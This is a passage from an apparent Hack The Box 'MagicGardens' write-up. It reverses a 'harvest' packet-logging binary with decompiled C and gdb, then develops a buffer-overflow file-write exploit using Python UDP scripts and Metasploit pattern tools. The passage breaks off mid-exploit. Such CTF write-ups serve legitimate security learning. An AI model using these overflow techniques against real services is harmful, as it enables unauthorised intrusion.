<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s, buf) )</span><br><span class="line">&#123;</span><br><span class="line">  v4 = <span class="built_in">strlen</span>(s);</span><br><span class="line">  write(a1, s, v4);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[*] Successful handshake&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>In conclusion, s is a string that gets manipulated and compared with the contents of buf. s1 is essentially a pointer to s, and s2 is a pointer to the buf string. The code is checking if s (through s1) and buf (through s2) are equal using _strcmp.</p>
<p>I‚Äôll fire up gdb alongside gef python extension and see what we got.<br>I‚Äôll first disassemble the server handshake function:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line">kujen@kujen:~$ gdb ./harvest</span><br><span class="line">GNU gdb (Ubuntu 15.0.50.20240403-0ubuntu1) 15.0.50.20240403-git</span><br><span class="line">Copyright (C) 2024 Free Software Foundation, Inc.</span><br><span class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</span><br><span class="line">This is free software: you are free to change and redistribute it.</span><br><span class="line">There is NO WARRANTY, to the extent permitted by law.</span><br><span class="line">Type <span class="string">&quot;show copying&quot;</span> and <span class="string">&quot;show warranty&quot;</span> <span class="keyword">for</span> details.</span><br><span class="line">This GDB was configured as <span class="string">&quot;x86_64-linux-gnu&quot;</span>.</span><br><span class="line">Type <span class="string">&quot;show configuration&quot;</span> <span class="keyword">for</span> configuration details.</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;https://www.gnu.org/software/gdb/bugs/&gt;.</span><br><span class="line">Find the GDB manual and other documentation resources online at:</span><br><span class="line">    &lt;http://www.gnu.org/software/gdb/documentation/&gt;.</span><br><span class="line"></span><br><span class="line">For <span class="built_in">help</span>, <span class="built_in">type</span> <span class="string">&quot;help&quot;</span>.</span><br><span class="line">Type <span class="string">&quot;apropos word&quot;</span> to search <span class="keyword">for</span> commands related to <span class="string">&quot;word&quot;</span>...</span><br><span class="line">GEF <span class="keyword">for</span> linux ready, <span class="built_in">type</span> `gef<span class="string">&#x27; to start, `gef config&#x27;</span> to configure</span><br><span class="line">93 commands loaded and 5 <span class="built_in">functions</span> added <span class="keyword">for</span> GDB 15.0.50.20240403-git <span class="keyword">in</span> 0.00ms using Python engine 3.12</span><br><span class="line">Reading symbols from ./harvest...</span><br><span class="line"></span><br><span class="line">This GDB supports auto-downloading debuginfo from the following URLs:</span><br><span class="line">  &lt;https://debuginfod.ubuntu.com&gt;</span><br><span class="line">Debuginfod has been disabled.</span><br><span class="line">To make this setting permanent, add <span class="string">&#x27;set debuginfod enabled off&#x27;</span> to .gdbinit.</span><br><span class="line">(No debugging symbols found <span class="keyword">in</span> ./harvest)</span><br><span class="line">gef‚û§  disassemble harvest_handshake_server</span><br><span class="line">Dump of assembler code <span class="keyword">for</span> <span class="keyword">function</span> harvest_handshake_server:</span><br><span class="line">   0x0000000000001b54 &lt;+0&gt;:     push   rbp</span><br><span class="line">   0x0000000000001b55 &lt;+1&gt;:     mov    rbp,rsp</span><br><span class="line">   0x0000000000001b58 &lt;+4&gt;:     sub    rsp,0x90</span><br><span class="line">   0x0000000000001b5f &lt;+11&gt;:    mov    DWORD PTR [rbp-0x84],edi</span><br><span class="line">   0x0000000000001b65 &lt;+17&gt;:    mov    QWORD PTR [rbp-0x90],rsi</span><br><span class="line">   0x0000000000001b6c &lt;+24&gt;:    lea    rax,[rbp-0x80]</span><br><span class="line">   0x0000000000001b70 &lt;+28&gt;:    pxor   xmm0,xmm0</span><br><span class="line">   0x0000000000001b74 &lt;+32&gt;:    movaps XMMWORD PTR [rax],xmm0</span><br><span class="line">   0x0000000000001b77 &lt;+35&gt;:    movaps XMMWORD PTR [rax+0x10],xmm0</span><br><span class="line">   0x0000000000001b7b &lt;+39&gt;:    movaps XMMWORD PTR [rax+0x20],xmm0</span><br><span class="line">   0x0000000000001b7f &lt;+43&gt;:    movaps XMMWORD PTR [rax+0x30],xmm0</span><br><span class="line">   0x0000000000001b83 &lt;+47&gt;:    lea    rcx,[rbp-0x80]</span><br><span class="line">   0x0000000000001b87 &lt;+51&gt;:    mov    eax,DWORD PTR [rbp-0x84]</span><br><span class="line">   0x0000000000001b8d &lt;+57&gt;:    mov    edx,0x40</span><br><span class="line">   0x0000000000001b92 &lt;+62&gt;:    mov    rsi,rcx</span><br><span class="line">   0x0000000000001b95 &lt;+65&gt;:    mov    edi,eax</span><br><span class="line">   0x0000000000001b97 &lt;+67&gt;:    call   0x1110 &lt;<span class="built_in">read</span>@plt&gt;</span><br><span class="line">   0x0000000000001b9c &lt;+72&gt;:    lea    rax,[rbp-0x40]</span><br><span class="line">   0x0000000000001ba0 &lt;+76&gt;:    pxor   xmm0,xmm0</span><br><span class="line">   0x0000000000001ba4 &lt;+80&gt;:    movaps XMMWORD PTR [rax],xmm0</span><br><span class="line">   0x0000000000001ba7 &lt;+83&gt;:    movaps XMMWORD PTR [rax+0x10],xmm0</span><br><span class="line">   0x0000000000001bab &lt;+87&gt;:    movaps XMMWORD PTR [rax+0x20],xmm0</span><br><span class="line">   0x0000000000001baf &lt;+91&gt;:    movaps XMMWORD PTR [rax+0x30],xmm0</span><br><span class="line">   0x0000000000001bb3 &lt;+95&gt;:    lea    rax,[rbp-0x40]</span><br><span class="line">   0x0000000000001bb7 &lt;+99&gt;:    movabs rcx,0x2074736576726168</span><br><span class="line">   0x0000000000001bc1 &lt;+109&gt;:   mov    QWORD PTR [rax],rcx</span><br><span class="line">   0x0000000000001bc4 &lt;+112&gt;:   mov    WORD PTR [rax+0x8],0x76</span><br><span class="line">   0x0000000000001bca &lt;+118&gt;:   lea    rax,[rbp-0x40]</span><br><span class="line">   0x0000000000001bce &lt;+122&gt;:   mov    rdi,rax</span><br><span class="line">   0x0000000000001bd1 &lt;+125&gt;:   call   0x10b0 &lt;strlen@plt&gt;</span><br><span class="line">   0x0000000000001bd6 &lt;+130&gt;:   lea    rdx,[rbp-0x40]</span><br><span class="line">   0x0000000000001bda &lt;+134&gt;:   add    rdx,rax</span><br><span class="line">   0x0000000000001bdd &lt;+137&gt;:   mov    rax,QWORD PTR [rbp-0x90]</span><br><span class="line">   0x0000000000001be4 &lt;+144&gt;:   mov    rsi,rax</span><br><span class="line">   0x0000000000001be7 &lt;+147&gt;:   mov    rdi,rdx</span><br><span class="line">   0x0000000000001bea &lt;+150&gt;:   call   0x1040 &lt;strcpy@plt&gt;</span><br><span class="line">   0x0000000000001bef &lt;+155&gt;:   lea    rax,[rbp-0x40]</span><br><span class="line">   0x0000000000001bf3 &lt;+159&gt;:   mov    rdi,rax</span><br><span class="line">   0x0000000000001bf6 &lt;+162&gt;:   call   0x10b0 &lt;strlen@plt&gt;</span><br><span class="line">   0x0000000000001bfb &lt;+167&gt;:   lea    rdx,[rbp-0x40]</span><br><span class="line">   0x0000000000001bff &lt;+171&gt;:   add    rax,rdx</span><br><span class="line">   0x0000000000001c02 &lt;+174&gt;:   mov    WORD PTR [rax],0xa</span><br><span class="line">   0x0000000000001c07 &lt;+179&gt;:   lea    rdx,[rbp-0x80]</span><br><span class="line">   0x0000000000001c0b &lt;+183&gt;:   lea    rax,[rbp-0x40]</span><br><span class="line">   0x0000000000001c0f &lt;+187&gt;:   mov    rsi,rdx</span><br><span class="line">   0x0000000000001c12 &lt;+190&gt;:   mov    rdi,rax</span><br><span class="line">   0x0000000000001c15 &lt;+193&gt;:   call   0x1130 &lt;strcmp@plt&gt;</span><br><span class="line">   0x0000000000001c1a &lt;+198&gt;:   <span class="built_in">test</span>   eax,eax</span><br><span class="line">   0x0000000000001c1c &lt;+200&gt;:   je     0x1c5d &lt;harvest_handshake_server+265&gt;</span><br><span class="line">   0x0000000000001c1e &lt;+202&gt;:   lea    rax,[rip+0x1ba2]        <span class="comment"># 0x37c7</span></span><br><span class="line">   0x0000000000001c25 &lt;+209&gt;:   mov    rdi,rax</span><br><span class="line">   0x0000000000001c28 &lt;+212&gt;:   call   0x1050 &lt;puts@plt&gt;</span><br><span class="line">   0x0000000000001c2d &lt;+217&gt;:   mov    eax,DWORD PTR [rbp-0x84]</span><br><span class="line">   0x0000000000001c33 &lt;+223&gt;:   mov    edx,0x15</span><br><span class="line">   0x0000000000001c38 &lt;+228&gt;:   lea    rcx,[rip+0x1b9c]        <span class="comment"># 0x37db</span></span><br><span class="line">   0x0000000000001c3f &lt;+235&gt;:   mov    rsi,rcx</span><br><span class="line">   0x0000000000001c42 &lt;+238&gt;:   mov    edi,eax</span><br><span class="line">   0x0000000000001c44 &lt;+240&gt;:   call   0x1080 &lt;write@plt&gt;</span><br><span class="line">   0x0000000000001c49 &lt;+245&gt;:   mov    eax,DWORD PTR [rbp-0x84]</span><br><span class="line">   0x0000000000001c4f &lt;+251&gt;:   mov    edi,eax</span><br><span class="line">   0x0000000000001c51 &lt;+253&gt;:   call   0x1100 &lt;close@plt&gt;</span><br><span class="line">   0x0000000000001c56 &lt;+258&gt;:   mov    eax,0x0</span><br><span class="line">   0x0000000000001c5b &lt;+263&gt;:   jmp    0x1c94 &lt;harvest_handshake_server+320&gt;</span><br><span class="line">   0x0000000000001c5d &lt;+265&gt;:   lea    rax,[rbp-0x40]</span><br><span class="line">   0x0000000000001c61 &lt;+269&gt;:   mov    rdi,rax</span><br><span class="line">   0x0000000000001c64 &lt;+272&gt;:   call   0x10b0 &lt;strlen@plt&gt;</span><br><span class="line">   0x0000000000001c69 &lt;+277&gt;:   mov    rdx,rax</span><br><span class="line">   0x0000000000001c6c &lt;+280&gt;:   lea    rcx,[rbp-0x40]</span><br><span class="line">   0x0000000000001c70 &lt;+284&gt;:   mov    eax,DWORD PTR [rbp-0x84]</span><br><span class="line">   0x0000000000001c76 &lt;+290&gt;:   mov    rsi,rcx</span><br><span class="line">   0x0000000000001c79 &lt;+293&gt;:   mov    edi,eax</span><br><span class="line">   0x0000000000001c7b &lt;+295&gt;:   call   0x1080 &lt;write@plt&gt;</span><br><span class="line">   0x0000000000001c80 &lt;+300&gt;:   lea    rax,[rip+0x1b69]        <span class="comment"># 0x37f0</span></span><br><span class="line">   0x0000000000001c87 &lt;+307&gt;:   mov    rdi,rax</span><br><span class="line">   0x0000000000001c8a &lt;+310&gt;:   call   0x1050 &lt;puts@plt&gt;</span><br><span class="line">   0x0000000000001c8f &lt;+315&gt;:   mov    eax,0x1</span><br><span class="line">   0x0000000000001c94 &lt;+320&gt;:   leave</span><br><span class="line">   0x0000000000001c95 &lt;+321&gt;:   ret</span><br><span class="line">End of assembler dump.</span><br><span class="line">gef‚û§</span><br></pre></td></tr></table></figure></div>

<p>Here we got the addresses of our two variables:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x0000000000001c0f &lt;+187&gt;:   mov    rsi,rdx</span><br><span class="line">0x0000000000001c12 &lt;+190&gt;:   mov    rdi,rax</span><br><span class="line">0x0000000000001c15 &lt;+193&gt;:   call   0x1130 &lt;strcmp@plt&gt;</span><br></pre></td></tr></table></figure></div>

<p>First I‚Äôll set my breakpoints and args:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gef‚û§  <span class="built_in">break</span> *0x555555555c0f</span><br><span class="line">Breakpoint 1 at 0x555555555c0f</span><br><span class="line">gef‚û§  <span class="built_in">break</span> *0x555555555c12</span><br><span class="line">Breakpoint 2 at 0x555555555c12</span><br><span class="line">gef‚û§  <span class="built_in">set</span> args server</span><br><span class="line">gef‚û§  </span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>Now I‚Äôll listen for incoming traffic and see the result of my comparison:<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/HackTheBox/Machines/MagicGardens/harvest1.png"
                      alt="Harvest"
                ><figcaption>Harvest</figcaption></figure><br>We can see that its comparing the version to <code>1.0.3</code> which is the harvest version we‚Äôre alreay working with.</p>
<p>So now I‚Äôll send our <code>harvest v1.0.3</code> string to the server and see what happens:<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/HackTheBox/Machines/MagicGardens/harvest2.png"
                      alt="Harvest"
                ><figcaption>Harvest</figcaption></figure><br>And we got a handshake!</p>
<h4 id="Buffer-Overflow"><a href="#Buffer-Overflow" class="headerlink" title="Buffer Overflow"></a>Buffer Overflow</h4><p>Now checking the code that handles raw packets:</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">handle_raw_packets</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *v3; <span class="comment">// rax</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> dest[<span class="number">10</span>]; <span class="comment">// [rsp+2Eh] [rbp-10072h] BYREF</span></span><br><span class="line">  <span class="type">time_t</span> timer; <span class="comment">// [rsp+38h] [rbp-10068h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v8[<span class="number">32</span>]; <span class="comment">// [rsp+40h] [rbp-10060h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v9[<span class="number">32</span>]; <span class="comment">// [rsp+60h] [rbp-10040h] BYREF</span></span><br><span class="line">  _BYTE s[<span class="number">14</span>]; <span class="comment">// [rsp+80h] [rbp-10020h] BYREF</span></span><br><span class="line">  __int16 v11; <span class="comment">// [rsp+8Eh] [rbp-10012h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// [rsp+1008Ch] [rbp-14h]</span></span><br><span class="line">  __int16 *v13; <span class="comment">// [rsp+10090h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v14; <span class="comment">// [rsp+1009Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0xFFFF</span>uLL);</span><br><span class="line">  v14 = recvfrom(a1, s, <span class="number">0xFFFF</span>uLL, <span class="number">0</span>, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  timer = time(<span class="number">0LL</span>);</span><br><span class="line">  v3 = ctime(&amp;timer);</span><br><span class="line">  <span class="built_in">strncpy</span>(dest, v3 + <span class="number">11</span>, <span class="number">8uLL</span>);</span><br><span class="line">  dest[<span class="number">8</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v14 &lt;= <span class="number">0x27</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Incomplete packet &quot;</span>);</span><br><span class="line">    close(a1);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v13 = &amp;v11;</span><br><span class="line">  v12 = <span class="number">255</span>;</span><br><span class="line">  <span class="built_in">sprintf</span>(v9, <span class="string">&quot;%.2x:%.2x:%.2x:%.2x:%.2x:%.2x&quot;</span>, s[<span class="number">6</span>], s[<span class="number">7</span>], s[<span class="number">8</span>], s[<span class="number">9</span>], s[<span class="number">10</span>], s[<span class="number">11</span>]);</span><br><span class="line">  <span class="built_in">sprintf</span>(v8, <span class="string">&quot;%.2x:%.2x:%.2x:%.2x:%.2x:%.2x&quot;</span>, v12 &amp; s[<span class="number">0</span>], v12 &amp; s[<span class="number">1</span>], v12 &amp; s[<span class="number">2</span>], v12 &amp; s[<span class="number">3</span>], v12 &amp; s[<span class="number">4</span>], v12 &amp; s[<span class="number">5</span>]);</span><br><span class="line">  <span class="keyword">if</span> ( *(_BYTE *)v13 == <span class="number">69</span> )</span><br><span class="line">    print_packet((_DWORD)v13, a3, a2, (<span class="type">unsigned</span> <span class="type">int</span>)v9, (<span class="type">unsigned</span> <span class="type">int</span>)v8, (<span class="type">unsigned</span> <span class="type">int</span>)dest, (__int64)s);</span><br><span class="line">  result = *(<span class="type">unsigned</span> __int8 *)v13;</span><br><span class="line">  <span class="keyword">if</span> ( (_BYTE)result == <span class="number">96</span> )</span><br><span class="line">    <span class="keyword">return</span> log_packet(v13, a3);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>We can see that if the IP is IPv6, it would show suspicious content, and then record it to a file.</p>
<p>This is the code for logging packets:</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">log_packet</span><span class="params">(__int64 a1, <span class="type">const</span> <span class="type">char</span> *a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">uint16_t</span> v3; <span class="comment">// [rsp+1Eh] [rbp-FF82h]</span></span><br><span class="line">  <span class="type">char</span> format[<span class="number">65360</span>]; <span class="comment">// [rsp+20h] [rbp-FF80h] BYREF</span></span><br><span class="line">  <span class="type">char</span> dest[<span class="number">40</span>]; <span class="comment">// [rsp+FF70h] [rbp-30h] BYREF</span></span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+FF98h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = htons(*(_WORD *)(a1 + <span class="number">4</span>));</span><br><span class="line">  <span class="keyword">if</span> ( v3 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">strcpy</span>(dest, a2);</span><br><span class="line">    <span class="built_in">strncpy</span>(format, (<span class="type">const</span> <span class="type">char</span> *)(a1 + <span class="number">60</span>), v3);</span><br><span class="line">    *(_WORD *)&amp;format[v3] = <span class="number">10</span>;</span><br><span class="line">    stream = fopen(dest, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( stream )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">fprintf</span>(stream, format);</span><br><span class="line">      fclose(stream);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;[!] Suspicious activity. Packages have been logged.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Bad log file&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>And the IPv4 addresses are allowed.</p>
<p>Let‚Äôs test the BOF now. I will write a small code that establishes a UDP connection to the local IPv6 server (::1 on port 1338) and then send my BOF data to it:</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">server_address = (<span class="string">&#x27;::1&#x27;</span>,<span class="number">1338</span>)</span><br><span class="line">s = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)</span><br><span class="line">s.connect(server_address)</span><br><span class="line">data = <span class="string">b&#x27;A&#x27;</span>*<span class="number">65500</span></span><br><span class="line">s.send(data)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>We can see that a lot of AAAAA written locally, which means that we really have a BOF:<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/HackTheBox/Machines/MagicGardens/harvest3.png"
                      alt="Harvest"
                ><figcaption>Harvest</figcaption></figure></p>
<p>Now the tricky part is to figure out where the file name will be in the payload, that‚Äôs why I‚Äôll use msf-pattern_create because it will give me a unique strings so I‚Äôll be able to determine indexes:<br><code>msf-pattern_create -l 65500 &gt; bof</code><br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/HackTheBox/Machines/MagicGardens/harvest4.png"
                      alt="Harvest"
                ><figcaption>Harvest</figcaption></figure></p>
<p>And now we have our filename: <code>Fu8Fu9Fv0Fv1Fv2Fv3Fv4Fv5Fv6Fv7Fv8Fv9Fw0Fw1Fw2Fw3Fw4Fw5Fw6Fw7Fw8Fw9Fx0Fx1Fx2Fx3Fx4Fx5Fx6Fx7Fx8Fx9Fy0Fy</code></p>
<p>Now if we try to find this string inside our msf-generated payload we‚Äôd find 4 occurances because that‚Äôs just how msf does it (by repeating trunks of the data):</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">‚îå‚îÄ‚îÄ(kali„âøkali)-[~]</span><br><span class="line">‚îî‚îÄ$ msf-pattern_offset -q Fu8F -l 65500 </span><br><span class="line">[*] Exact match at offset 4524</span><br><span class="line">[*] Exact match at offset 24804</span><br><span class="line">[*] Exact match at offset 45084</span><br><span class="line">[*] Exact match at offset 65364</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>We can keep testing and eventually we‚Äôll get that the offset we‚Äôre looking for is 65364. So let‚Äôs modify our script:<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/HackTheBox/Machines/MagicGardens/harvest5.png"
                      alt="Harvest"
                ><figcaption>Harvest</figcaption></figure><br>And the filename was successfully written.</p>
<p>Now I‚Äôll have to find-tune the code a bit to ensure that the filename is correctly written.<br>We slightly increased the offset to 65372 to ensure that our filename string fit within the expected memory region.<br>This ensured that the filename was properly terminated and didn‚Äôt interfere with surrounding data.<br>The newline (\r) was placed correctly, preventing parsing issues:</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">‚îå‚îÄ‚îÄ(kali„âøkali)-[~]</span><br><span class="line">‚îî‚îÄ$ cat code.py      </span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">server_address = (<span class="string">&#x27;::1&#x27;</span>,<span class="number">1338</span>)</span><br><span class="line">s = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)</span><br><span class="line">s.connect(server_address)</span><br><span class="line">data=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;bof.txt&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data=<span class="built_in">bytearray</span>(f.read())</span><br><span class="line">new=<span class="string">b&quot;/tmp/kujen.txt\r&quot;</span></span><br><span class="line"><span class="comment">#data[65372:len(new)]=new</span></span><br><span class="line">s.send(data[:<span class="number">65372</span>]+new)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>And we can see the beginning of what was written into the file:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">‚îå‚îÄ‚îÄ(kali„âøkali)-[~]</span><br><span class="line">‚îî‚îÄ$ <span class="built_in">cat</span> /tmp/kujen.txt$<span class="string">&#x27;\r&#x27;</span></span><br><span class="line">Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al&lt;snip&gt;</span><br></pre></td></tr></table></figure></div>
<p>Checking the offset now:</p>
